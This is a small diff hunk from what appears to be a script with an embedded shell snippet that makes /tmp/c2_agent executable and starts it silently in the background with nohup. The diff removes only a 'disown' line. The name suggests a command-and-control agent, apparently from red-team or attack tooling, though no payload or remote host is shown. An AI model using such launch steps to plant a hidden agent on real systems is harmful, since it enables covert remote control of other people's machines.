@@ -344,7 +344,6 @@ fi
 chmod +x /tmp/c2_agent
 echo "[*] Starting agent in background..."
 nohup /tmp/c2_agent >/dev/null 2>&1 &
-disown
 echo "[+] Agent running (PID $!)"
 """
 
